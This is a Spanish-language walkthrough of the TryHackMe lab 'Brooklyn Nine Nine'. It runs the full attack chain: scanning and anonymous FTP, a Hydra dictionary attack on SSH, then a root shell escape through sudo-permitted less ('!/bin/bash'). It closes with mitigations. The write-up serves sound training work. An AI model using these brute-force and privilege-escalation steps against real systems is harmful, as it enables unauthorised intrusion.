# Brooklyn Nine Nine

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / FTP / Steganography / SSH / Hydra / Sudo / Less

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.128.159.199
```

- Encontramos:

- `21/tcp` → FTP
- `22/tcp` → SSH
- `80/tcp` → HTTP

- El servidor FTP permite acceso anónimo:

```text
ftp-anon: Anonymous FTP login allowed
```

## 2. Enumeración

### Enumeración web

- Accedemos a la página:

```text
http://10.128.159.199/
```

- La web prácticamente solo contiene una imagen, por lo que revisamos el contenido y el código fuente.

- Realizamos fuzzing:

```bash
ffuf -u http://10.128.159.199/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- No encontramos rutas especialmente relevantes.

### Enumeración FTP

- Accedemos al servidor FTP:

```bash
ftp 10.128.159.199
```

- Utilizamos el usuario:

```text
anonymous
```

- Enumeramos los archivos:

```text
ls
```

- Encontramos archivos relacionados con la máquina.

- Uno de ellos contiene un mensaje de Amy:

```text
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

- Descargamos el archivo desde FTP utilizando:

```text
get <archivo>
```

- El mensaje nos da una pista importante: el usuario `jake` tiene una contraseña débil.

### Imagen

- La web muestra una imagen:

```text
brooklyn99.jpg
```

- Accedemos directamente:

```text
http://10.128.159.199/brooklyn99.jpg
```

- Guardamos la imagen para analizarla.

- Comprobamos el tipo de archivo:

```bash
file brooklyn99.jpg
```

- Revisamos los metadatos:

```bash
exiftool brooklyn99.jpg
```

- También intentamos encontrar información oculta relacionada con esteganografía.

- No encontramos ninguna información útil mediante este análisis.

### Fuerza bruta SSH

- Como tenemos el usuario `jake` y una pista que indica que su contraseña es débil, probamos un ataque de diccionario contra SSH:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.128.159.199
```

- Hydra encuentra unas credenciales válidas:

```text
login: jake
password: X
```

## 3. Explotación

### Acceso mediante SSH

- Utilizamos las credenciales obtenidas:

```bash
ssh jake@10.128.159.199
```

- Introducimos la contraseña encontrada y conseguimos acceso como `jake`.

### User Flag

- Accedemos al directorio personal donde se encuentra la flag:

```bash
cat /home/holt/user.txt
```

- Obtenemos la User Flag.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos qué comandos puede ejecutar `jake` mediante `sudo`:

```bash
sudo -l
```

- Encontramos:

```text
(ALL) NOPASSWD: /usr/bin/less
```

- Esto significa que `jake` puede ejecutar `less` como cualquier usuario, incluido `root`, sin proporcionar contraseña.

### Abuso de `less`

- Ejecutamos:

```bash
sudo /usr/bin/less /etc/passwd
```

- `less` es un paginador de texto, pero permite ejecutar comandos externos desde dentro de la aplicación mediante `!`.

- Dentro de `less` ejecutamos:

```text
!/bin/bash
```

- Como `less` está siendo ejecutado mediante `sudo` con privilegios de `root`, la shell lanzada desde `less` hereda esos privilegios.

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente obtenemos la Root Flag:

```bash
cat /root/root.txt
```

## 5. Reporte

- La máquina **Brooklyn Nine Nine** expone FTP, SSH y HTTP.
- El FTP permite acceso anónimo y contiene un mensaje de Amy indicando que la contraseña de `Jake` es demasiado débil.
- La web muestra una imagen `brooklyn99.jpg`, que analizamos junto con sus metadatos, aunque no obtenemos información útil.
- Con el usuario `jake` identificado, utilizamos Hydra contra SSH y recuperamos una contraseña válida.
- Conseguimos acceder mediante SSH como `jake` y obtenemos la User Flag.
- Mediante `sudo -l` descubrimos que `jake` puede ejecutar `/usr/bin/less` como `root` sin contraseña.
- Aprovechamos la funcionalidad de `less` para ejecutar `/bin/bash` desde dentro del paginador.
- Como `less` se está ejecutando con privilegios de `root`, la shell también obtiene privilegios de `root`.
- Finalmente accedemos a `/root/root.txt` y obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
FTP Anonymous
 ↓
Mensaje de Amy
 ↓
Usuario Jake
 ↓
Hydra
 ↓
Credenciales SSH
 ↓
SSH como Jake
 ↓
User Flag
 ↓
sudo -l
 ↓
less como root
 ↓
!/bin/bash
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| FTP Anonymous Access | Media | Permite acceder a archivos sin autenticación |
| Contraseña débil de `jake` | Alta | Permite recuperar las credenciales mediante fuerza bruta |
| `less` permitido mediante sudo | Crítica | Permite ejecutar una shell como root |

### Mitigaciones

- Deshabilitar el acceso anónimo a FTP cuando no sea estrictamente necesario.
- Utilizar contraseñas robustas y únicas.
- Implementar mecanismos de protección frente a ataques de fuerza bruta.
- Aplicar el principio de mínimo privilegio en las reglas de `sudo`.
- No permitir que usuarios sin privilegios ejecuten paginadores como `less` con permisos de root.
- Revisar periódicamente las reglas de `sudoers`.

## 🧠 Lessons Learned

- FTP con acceso anónimo puede proporcionar pistas y archivos útiles para continuar una intrusión.
- Una pista aparentemente sencilla sobre una contraseña puede ser suficiente para justificar un ataque de diccionario contra un servicio.
- Hydra permite automatizar ataques de diccionario contra SSH.
- `sudo -l` es una comprobación fundamental para identificar comandos privilegiados.
- Programas como `less` pueden ser peligrosos cuando se ejecutan mediante `sudo` porque permiten ejecutar comandos externos.
- `!` dentro de `less` permite ejecutar comandos del sistema.
- Un binario permitido mediante `sudo` puede convertirse en un vector de escalada aunque su función original sea simplemente mostrar archivos.
